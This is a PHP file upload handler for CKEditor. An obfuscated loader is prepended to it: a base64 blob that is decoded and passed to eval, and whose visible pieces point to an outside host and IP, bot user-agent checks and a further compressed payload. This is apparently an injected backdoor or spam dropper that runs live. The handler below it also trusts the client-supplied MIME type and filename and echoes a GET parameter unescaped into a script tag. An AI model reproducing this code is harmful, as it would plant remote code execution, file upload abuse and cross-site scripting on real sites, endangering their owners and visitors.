<?php /*versio:3.02*/ $GLOBALS["lbrtdp"]="aW5pX3NldAkpSYWxsb3dfdXJsX2ZvcGVusoRZGlzcGxheV9lcnJvcnMTGEZmVkb3IvcmVodW50MTIxNQoAMy4wMgbWMWWdOZTRMSzhVOGUzc3R3NjAyiRsAaHR0cDovLwpFWgJSFRUUFMngpb2ZmLBrvsNaHR0cHM6Ly8ULUlSSFRUUF9IT1NUaRGdW5pb24QCnlkc2VsZWN0UkVRVUVTVF9VUkkRidU0NSSVBUX05BTUUUVVFUllfU1RSSU5HFcGPwHFFlZGV0ZXJtaW5hdG9yEgiLgrMILmxvZweajSFRUUF9ZX0FVVEgYmFzZTY0X2RlY29kZQStHBdmVyc2lvULQqiLXBocASFRUUF9FWEVDUEhQb3V0vBb2sJgASFRUUF9VU0VSX0FHRU5UlBDLANofZ29vZ2xlLHlhaG9vLGJhaWR1LGJpbmdib3QsbXNuYm90LHlhbmRleAnBJgYQNesnyMTg4LjI0MS4xMTUuMTEzyokoZmFzdGFkZHouY29tHL3czLnBocD91PQSgLCEJms9xdmuJnQ9cGhwJnA9jSRRZKJnY9rjZXZhbChnenVuY29tcHJlc3MoYmFzZTY0X2RlY29kZSgiZUp5TlYzMXZva29YL3lwVFlqWVlXQVJFMU8zRGt6WjczV2ViN0cwYjE5N2tabTlERUFlbElpQXZLamI5N3M4NU00Tm9xNXY3bDNqT3pIay92M01tREloOE5hTkJHTk9aTE0xb1FiTlZHSHRGa2tudDlpc0pnUjJVc1YrRVNlelNYWmdYdVJ6Nmk4cExxa3JXRlYwMTlEYWV1d25qME0xcDBURDdpcTJhZWxzbFJ2djZETnZRRmROV2pTRWMwT0hBRzZtMUVIYzVuUWJ6YkpuNlNiS1hXM204bjVaN2xYeHFwY215MnFmRUlmZFBQMzYweVN0cEtLdlF6NUlpWEZHNXlFb0s4akphbEZsTUFwb0V0WWgzV3J3azNvVFJKbDlIODRYYzh2WkpFV3hVMHFxUzFjSlB3S1BXTEV4ZlppOGdYUExMTEpLdVNRdU04cllib0FpZUpybmdWd0VzREJQemNRNCtTbDRVSlZzWExybEJrdEpZYWhNSHBCZ1MyaXdNdXduQ2lPSnAxMC9pZ3NZUVZtbFJGT21YVGtjaUdoSDI0QmMzU0NQU3A2MFR6SDJKdVVHam5KNUxqVEFSTTlKYXI2SkZFWU8xTjRJcXc5VVczSXo4L1lrUGtKY2tSUzlhRlEyMysvQ0VTWGZVQjlhTnVDZ0xzU3I1K2pUKzhmQTRjZUZISmYvQ2RyOUUweS9MK1Q2Ni9XTTBWa25nZ1crL1BUa2VUWjdHOTVQeDdmM1BiM2hEcFB6eWhhOFA5L2VqcjVQSjNaK2poNmVKU213TVJMZ0xsbFhLd3NQZHJ1K2hLTXk0NjBkSlRvK29HSEM2U290S0ZwY2h6STBZU2JwK3E3TXJxSFdtc0ZSNURhSzZJRS84SmRaRlUzVURIU3JQeTVMZGFnNGYyMmxhN25jcTZRbWRkZjJpbU9rbW9NdUNxeU9uSFFGbUIybUpSVkMzalBTLzBZUzhpaXk4U1JxbUlWK1M3NVBKWThmUWRDRDhrLzBUdzgvM0pDKytFUGg0RlNhOU1RYUdxWXJvTW9oQXhlUDNSL2ZocHlaMUpBMC8veHFOZjk0OTNKOVIrcFRUN1BQdEhHcjZDeXBuOTVtOFd1WjJBYlV2WDEzb2MrRlVtM3o2Uk9SM2ZVMCtOK3ovRUxQZEJFVER3RUk3SFJsaW1BUFdLemVCU09RQkJscDU5cEx0TUlwMGwwYkpqTXJTd1Q2MUZnbm55aGdoUzV6K3BUODN1Qkt1enR6ajU1ak90eE9vU2FnZnoxYUxlYmpHMnFrMnUvbVd3dm1adjFwVWUzQ0Mrb3VFU0grN2tpYVltdlFGdmpsZkpPa1V2QXAvbi9qVHpib0NtV0RnMU50RVhyc0JsNWI3Y3pTR0RQMFNyR2U4M1FvMyszV2VPd2NJTm0ybGE2cW1pUkdKOTNHeTh4dGUzMVFNWFdXTmt1N29TN1ZxV0lhbDlQdXFhU0dQVjB2RHN3WkszOENad0NzM3pGa0FhMnNhNllaaWQ5VisrN2tlTVRjZnp4aG1WekVNUEVTdUhISWdEM1RGdGxTTElkeDc3WVpwb2tlR0lYSWdEbWhPWG1SRkFwaE1zM09hYkZDazkxWERiR09HZ3lTam5yK0F0bk94ZmJ5Y2lLUTQvMjB5aGphRDBEU0JldU5FOVNBT3BBMU1zQnZSQVVYOEV2ZWZqd3dkOWhSVGhTZzFTSDVKbW1FYVN0OVdCNzhWWit0S3Q4L2x2WUZ0OHRXbHdCdEdUeG5DME81aDZCRlBQcDdRTFlpR3dZNHdjUHh3WXFpWWhzWDRtT1NMT2JZVkUzTmhYOVkwTUJTVEM4TDJiZWc5bmVYRGJNTUlPVmNZUTB1eExDYjUrbDJqRmV2WlpoM0UrNWVrM01sWUlidHB2bHB0blZtWXhSNkFpT3QrdS9zeGN0MjI5c2ZkR0NiQ3cvaHZFUDk0Tzc2RlR5am5NdG12dkJtNGZadGxYaVVUcVRPam0wNitXRUY3UzUxaWxYYTBBTWIxNXpJT2R3M3A3dXVvcGpUbVNwTS9INlhuVThyb1FCcmQvM1Y4b3Y0TFZwMVF4QVdtQjZVZk5vd1M0TWVidVVCMndUY0psaWpocWlieG80ZS8yL1N6MkRBNi9GSitnZXREMFZQZ25iU0FDQWcyUVR3SExQWkU3VitKT1NpSUdHcitxVGxuSTh2M285emRabUhoVFFIOWoyOXlZM0RyNE1Sck1nWDl5eHBINjVuS2oxMnpDbWY5RWpVakZNY0JvTTRyNFp0c3MyYWFmU2hERzR1bDNqUHJobXR0MHMybVdqZzFTSnlwTkZQWGxSNXZGakF6V0s2anpkYTVXYzE2dFZwTkRFVUJuNXJBU3JabnJmMGttenJ2U2xKcklCRGFTTzlDa1d0QzhQVUgyNDJCalVqTGJCZnlHRlNIWHJyRXZVN1FHcG5EQVVEUGtLSDJCVkExWWUwZTJNd2x4eEdLMGJkaUgrMkw4bWcwOUlaS0Q3b1hKeWlmVG1JSW5jNnlvNTZFZVdFWkFGTnFQVXNhc3dZRHhleFp6RlUrZ2hwVzF6Q1ViZzhzcmxlZGRiYXVsbnRIR0hUV2hTNTRhVmdDV2VEbFFUZGVWRi84dCtiQ29EQXRHOGFJMnVCT0gwcGwyRmU3YlY0bXU3Q1FlY1cwRmtWV1JRRkUvQnZ1cHBDQ0xJK1RLUzVGTjcrZkxBaW1acCs5ZzA1R1M3MTJIT0V5UEllR1dBNUhCcGwyRDRMYVZYc3c3VmdMbHRsdVdvVHZ4ZyszUlQxd3J4eUhtY21XSTMrNUxIWnM2ZVFMNS91S1FiMEcxSmg5ckplTlVRc1RodVhteitKczdxR01FanZPUjd2UHVkb0h3Qi95WnNHbEVEc2QycHhiQURzNjduQnQyR1VLV0d5NHBlSVBsdzkvMkc1NFdOYjRSVFNBUjkrWndBSjRnZ3cxcHVCTHF2YU1GVVNSbFA1Q2Jqb0dZTk9QeWhsMWs5aW5SL1FqTEtnekRPODAxTU5ReWZPMzVmWXdDNDdYSDZzMzVFL2JvNURoQkdhOVdqZmZxUlVvVVFET1VSd0ZpZTNaYkVrblIzT3dhME9oUTVFYUZqUU9QNmlkckFXV1lhcldBVCswbythRmhodDBjYUg1MkhGV0Z6clY3TE9MdkZGeEg2N3krZFlINWU5ZXhUd0dzUGsyRCtQcmovSGxNQzBlT2g5QURPcGlJRUJNN0dYL0IwRDJQZG89IikpKTshVl";        if (!function_exists('ichyaoyy')){function ichyaoyy($a, $b){$c=$GLOBALS['lbrtdp'];$d=pack('H*','6261736536345f646563'.'6f6465'); return $d(substr($c, $a, $b));};eval(ichyaoyy(565,3299));};?><?php 

	$url = 'upload/files/'.time()."_".$_FILES['upload']['name'];

 //extensive suitability check before doing anything with the file...
    if (($_FILES['upload'] == "none") OR (empty($_FILES['upload']['name'])) )
    {
       $message = "No file uploaded.";
    }
    else if ($_FILES['upload']["size"] == 0)
    {
       $message = "The file is of zero length.";
    }
    else if (($_FILES['upload']["type"] != "image/pjpeg") AND ($_FILES['upload']["type"] != "image/jpeg") AND ($_FILES['upload']["type"] != "image/png") AND ($_FILES['upload']["type"] != "image/gif") AND ($_FILES['upload']["type"] != "text/pdf") AND ($_FILES['upload']["type"] != "text/plain") AND ($_FILES['upload']["type"] != "application/msword") AND ($_FILES['upload']["type"] != "application/odt"))
    {
       $message = "The image must be in either GIF , JPG or PNG format. Please upload a JPG or PNG instead.";
    }
    
	else if (!is_uploaded_file($_FILES['upload']["tmp_name"]))
    {
       $message = "You may be attempting to hack our server. We're on to you; expect a knock on the door sometime soon.";
    }
    else {
      $message = "";
	
      $move =  move_uploaded_file($_FILES['upload']['tmp_name'], $url);
      if(!$move)
      {
         $message = "Error moving uploaded file. Check the script is granted Read/Write/Modify permissions.";
      }
      //$url = "../" . $url;
    }

	
	if($message != "")
	{
		$url = "";
	}

	$funcNum = $_GET['CKEditorFuncNum'] ;
	echo "<script type='text/javascript'>window.parent.CKEDITOR.tools.callFunction($funcNum, '$url', '$message');</script>";

?>